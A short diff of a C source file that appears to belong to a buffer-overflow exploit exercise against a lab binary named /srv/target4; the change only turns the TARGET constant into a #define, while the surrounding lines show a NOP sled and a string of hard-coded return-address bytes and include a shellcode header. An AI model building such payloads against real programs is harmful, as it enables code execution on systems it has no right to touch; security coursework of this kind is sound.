@@ -5,7 +5,7 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* TARGET = "/srv/target4";
+#define TARGET "/srv/target4"
 
 const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
 const char* ADD = "\x60\x43\xe1\xf7\xc0\x6e\xe0\xf7\x63\xf3\xf5\xf7";
